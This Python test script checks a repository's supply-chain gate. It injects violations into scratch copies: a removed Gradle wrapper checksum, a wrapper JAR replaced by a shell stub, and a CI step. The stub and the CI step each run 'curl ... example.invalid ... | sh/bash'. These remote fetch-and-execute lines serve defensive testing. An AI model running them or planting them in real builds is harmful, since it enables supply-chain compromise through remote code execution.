#!/usr/bin/env python3
"""
Negative tests for scripts/check_supply_chain.py.

Each case injects a REAL violation into a scratch copy and asserts the gate
fails mentioning it - plus a positive control for the all-pinned state and a
check that the floating-tag audit stays report-only (exit 0).
"""
from __future__ import annotations

import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

SRC = Path(__file__).resolve().parent.parent.parent  # repo root
PY = sys.executable

results: list[tuple[bool, str]] = []


def run_gate(repo: Path) -> subprocess.CompletedProcess:
    return subprocess.run(
        [PY, str(repo / "scripts" / "check_supply_chain.py")],
        capture_output=True, text=True, cwd=repo,
    )


def case(name: str, mutate, expect_substring: str) -> None:
    with tempfile.TemporaryDirectory() as tmp:
        repo = Path(tmp) / "repo"
        shutil.copytree(
            SRC, repo,
            ignore=shutil.ignore_patterns(".git", "build", ".gradle", ".kotlin"),
        )
        mutate(repo)
        proc = run_gate(repo)
        out = proc.stdout + proc.stderr
        ok = (proc.returncode != 0) and (expect_substring.lower() in out.lower())
        results.append((ok, name))
        print(f"[{'PASS' if ok else 'FAIL'}] {name}")
        if not ok:
            print(f"       exit={proc.returncode} (want non-zero)  "
                  f"mentions {expect_substring!r}")
            print("       --- gate output ---")
            for line in out.splitlines()[:12]:
                print("       " + line)


def mutate_drop_checksum(repo: Path) -> None:
    f = repo / "gradle" / "wrapper" / "gradle-wrapper.properties"
    lines = [ln for ln in f.read_text(encoding="utf-8").splitlines()
             if not ln.startswith("distributionSha256Sum=")]
    f.write_text("\n".join(lines) + "\n", encoding="utf-8")


def mutate_stub_jar(repo: Path) -> None:
    f = repo / "gradle" / "wrapper" / "gradle-wrapper.jar"
    f.write_bytes(b"#!/bin/sh\nexec curl https://example.invalid/g.sh | sh\n")


def mutate_pipe_shell(repo: Path) -> None:
    f = repo / ".github" / "workflows" / "ci.yml"
    s = f.read_text(encoding="utf-8")
    s += ("\n      - name: Fetch helper\n"
          "        run: curl -fsSL https://example.invalid/x.sh | bash\n")
    f.write_text(s, encoding="utf-8")


case("RULE 1 catches a missing distributionSha256Sum",
     mutate_drop_checksum, "distributionSha256Sum")
case("RULE 2 catches a stubbed wrapper JAR", mutate_stub_jar, "not a ZIP")
case("RULE 3 catches curl-pipe-to-shell in a workflow",
     mutate_pipe_shell, "pipe-to-shell")


# ── Positive control: floating third-party pin stays report-only ──────────────
with tempfile.TemporaryDirectory() as tmp:
    repo = Path(tmp) / "repo"
    shutil.copytree(
        SRC, repo,
        ignore=shutil.ignore_patterns(".git", "build", ".gradle", ".kotlin"),
    )
    proc = run_gate(repo)
    out = proc.stdout + proc.stderr
    ok = proc.returncode == 0 and "floating" in out.lower()
    results.append((ok, "floating action tags are audited, not gated"))
    print(f"[{'PASS' if ok else 'FAIL'}] floating action tags are audited, "
          "not gated")
    if not ok:
        print(f"       exit={proc.returncode} (want 0)")
        for line in out.splitlines()[:12]:
            print("       " + line)

# ── Summary ───────────────────────────────────────────────────────────────────
ok = sum(1 for r, _ in results if r)
total = len(results)
print(f"\n{ok}/{total} supply-chain-gate negative-tests behaved correctly")
if ok != total:
    print("FAILURES:")
    for r, n in results:
        if not r:
            print(f"  - {n}")
    sys.exit(1)
print("ALL SUPPLY-CHAIN-GATE NEGATIVE-TESTS PASS")
